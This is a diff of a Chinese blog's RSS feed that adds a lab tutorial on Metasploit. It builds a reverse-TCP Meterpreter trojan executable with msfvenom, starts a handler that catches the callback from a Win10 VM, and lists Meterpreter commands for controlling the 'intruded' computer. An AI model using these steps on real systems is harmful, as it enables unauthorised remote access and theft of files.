@@ -1,1 +1,208 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>病毒 on PDZL</title><link>https://pdzl.github.io/categories/%E7%97%85%E6%AF%92/</link><description>Recent content in 病毒 on PDZL</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>PDZL</copyright><atom:link href="https://pdzl.github.io/categories/%E7%97%85%E6%AF%92/index.xml" rel="self" type="application/rss+xml"/></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>病毒 on PDZL</title><link>https://pdzl.github.io/categories/%E7%97%85%E6%AF%92/</link><description>Recent content in 病毒 on PDZL</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>PDZL</copyright><lastBuildDate>Thu, 09 Oct 2025 16:58:35 +0800</lastBuildDate><atom:link href="https://pdzl.github.io/categories/%E7%97%85%E6%AF%92/index.xml" rel="self" type="application/rss+xml"/><item><title>Msf</title><link>https://pdzl.github.io/p/msf/</link><pubDate>Thu, 09 Oct 2025 16:58:35 +0800</pubDate><guid>https://pdzl.github.io/p/msf/</guid><description>&lt;img src="https://pdzl.github.io/p/msf/msfvenom.png" alt="Featured image of post Msf" /&gt;&lt;h2 id="前文"&gt;前文
+&lt;/h2&gt;&lt;p&gt;MSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。&lt;/p&gt;
+&lt;h3 id="演示环境"&gt;演示环境
+&lt;/h3&gt;&lt;p&gt;使用kali进行演示操作
+目标靶机：Win10
+软件：msfvenom、msfconsole（Kali系统内置）&lt;/p&gt;
+&lt;h2 id="渗透流程"&gt;渗透流程
+&lt;/h2&gt;&lt;h3 id="进入管理员模式"&gt;进入管理员模式
+&lt;/h3&gt;&lt;p&gt;命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo su
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009182546194.png"
+width="342"
+height="126"
+srcset="https://pdzl.github.io/p/msf/image-20251009182546194_hu_cea954f59c2db1ef.png 480w, https://pdzl.github.io/p/msf/image-20251009182546194_hu_ad1a65df76fb9871.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="271"
+data-flex-basis="651px"
+&gt;&lt;/p&gt;
+&lt;h3 id="生成可执行木马文"&gt;生成可执行木马文
+&lt;/h3&gt;&lt;p&gt;命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=6666 -f exe -o /tmp/win.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009183406564.png"
+width="881"
+height="133"
+srcset="https://pdzl.github.io/p/msf/image-20251009183406564_hu_165250b204cb8b6e.png 480w, https://pdzl.github.io/p/msf/image-20251009183406564_hu_2ab92897b03b0a3c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="662"
+data-flex-basis="1589px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009183425116.png"
+width="1028"
+height="347"
+srcset="https://pdzl.github.io/p/msf/image-20251009183425116_hu_5f54993b2f58b303.png 480w, https://pdzl.github.io/p/msf/image-20251009183425116_hu_e4f26676f9ff3c37.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="296"
+data-flex-basis="711px"
+&gt;&lt;/p&gt;
+&lt;p&gt;生成木马文件win.exe&lt;/p&gt;
+&lt;p&gt;将木马文件放入win10虚拟机中&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009184058510.png"
+width="782"
+height="600"
+srcset="https://pdzl.github.io/p/msf/image-20251009184058510_hu_7a31aea9fcb6282.png 480w, https://pdzl.github.io/p/msf/image-20251009184058510_hu_432bf89bb298faf4.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="130"
+data-flex-basis="312px"
+&gt;&lt;/p&gt;
+&lt;h3 id="运行msfconsole命令"&gt;运行msfconsole命令
+&lt;/h3&gt;&lt;p&gt;命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009184328733.png"
+width="606"
+height="516"
+srcset="https://pdzl.github.io/p/msf/image-20251009184328733_hu_dba2a583637982a3.png 480w, https://pdzl.github.io/p/msf/image-20251009184328733_hu_89bc0f50dabd1f2a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="281px"
+&gt;&lt;/p&gt;
+&lt;h3 id="配置参数"&gt;配置参数
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;）命令：&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;multi&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt; &lt;span class="err"&gt;（选择模块）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="err"&gt;）命令：&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;reverse_tcp&lt;/span&gt;&lt;span class="err"&gt;（选择攻击模块）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="err"&gt;）命令：&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;LhOST&lt;/span&gt; &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;20.129&lt;/span&gt; &lt;span class="err"&gt;（填写自己主机的&lt;/span&gt;&lt;span class="n"&gt;IP地址&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="err"&gt;）命令：&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;lport&lt;/span&gt; &lt;span class="mi"&gt;6666&lt;/span&gt; &lt;span class="err"&gt;（填写刚才生成文件时的端口号）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="err"&gt;）命令：&lt;/span&gt; &lt;span class="n"&gt;show&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt; &lt;span class="err"&gt;（查看设置参数）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="err"&gt;）命令：&lt;/span&gt; &lt;span class="n"&gt;exploit&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;z&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="err"&gt;（后台执行）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009184804009.png"
+width="645"
+height="142"
+srcset="https://pdzl.github.io/p/msf/image-20251009184804009_hu_bec01b417c1b2081.png 480w, https://pdzl.github.io/p/msf/image-20251009184804009_hu_8abadeca5bec0369.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="454"
+data-flex-basis="1090px"
+&gt;&lt;/p&gt;
+&lt;h3 id="在靶机打开执行文件"&gt;在靶机打开执行文件
+&lt;/h3&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009184923585.png"
+width="782"
+height="600"
+srcset="https://pdzl.github.io/p/msf/image-20251009184923585_hu_1f26122087ffdabb.png 480w, https://pdzl.github.io/p/msf/image-20251009184923585_hu_1c330a198356fbac.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="130"
+data-flex-basis="312px"
+&gt;&lt;/p&gt;
+&lt;h3 id="查看用户"&gt;查看用户
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;(1)命令： sessions（查看上钩的用户）
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;(2)命令： sessions -i 1（选择需要攻击的用户，这里选择第 1 个）
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009192400008.png"
+width="658"
+height="365"
+srcset="https://pdzl.github.io/p/msf/image-20251009192400008_hu_a73fefeded1106a.png 480w, https://pdzl.github.io/p/msf/image-20251009192400008_hu_2ca84719c5f03c01.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="180"
+data-flex-basis="432px"
+&gt;&lt;/p&gt;
+&lt;h2 id="入侵对方电脑的命令"&gt;入侵对方电脑的命令
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cmd指令&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="err"&gt;读取文件内容到屏幕&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cd&lt;/span&gt; &lt;span class="err"&gt;更改目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;checksum&lt;/span&gt; &lt;span class="err"&gt;检索文件的校验和&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cp&lt;/span&gt; &lt;span class="err"&gt;将源复制到目标&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;del&lt;/span&gt; &lt;span class="err"&gt;删除指定文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;dir&lt;/span&gt; &lt;span class="err"&gt;列出文件（&lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt; &lt;span class="err"&gt;的别名）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;下载&lt;/span&gt; &lt;span class="err"&gt;下载文件或目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="err"&gt;编辑&lt;/span&gt; &lt;span class="err"&gt;编辑文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;getlwd&lt;/span&gt; &lt;span class="err"&gt;打印本地工作目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;getwd&lt;/span&gt; &lt;span class="err"&gt;打印工作目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;lcd&lt;/span&gt; &lt;span class="err"&gt;更改本地工作目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;lls&lt;/span&gt; &lt;span class="err"&gt;列出本地文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;lpwd&lt;/span&gt; &lt;span class="err"&gt;打印本地工作目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ls&lt;/span&gt; &lt;span class="err"&gt;列出文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;mkdir&lt;/span&gt; &lt;span class="err"&gt;创建目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;mv&lt;/span&gt; &lt;span class="err"&gt;将源移动到目标&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;pwd&lt;/span&gt; &lt;span class="err"&gt;打印工作目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;rm&lt;/span&gt; &lt;span class="err"&gt;删除指定文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;rmdir&lt;/span&gt; &lt;span class="err"&gt;删除目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;search&lt;/span&gt; &lt;span class="err"&gt;搜索文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;show_mount&lt;/span&gt; &lt;span class="err"&gt;列出所有挂载点&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="err"&gt;逻辑驱动器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;upload&lt;/span&gt; &lt;span class="err"&gt;上传文件或目录&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;pkill&lt;/span&gt; &lt;span class="err"&gt;按名称终止进程&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/msf/image-20251009192657913.png"
+width="444"
+height="222"
+srcset="https://pdzl.github.io/p/msf/image-20251009192657913_hu_65a3ed6b642f83c5.png 480w, https://pdzl.github.io/p/msf/image-20251009192657913_hu_863ca08cc7a1966d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="200"
+data-flex-basis="480px"
+&gt;&lt;/p&gt;
+&lt;blockquote class="alert alert-error"&gt;
+&lt;p&gt;成功入侵对方电脑&lt;/p&gt;&lt;/blockquote&gt;</description></item></channel></rss>
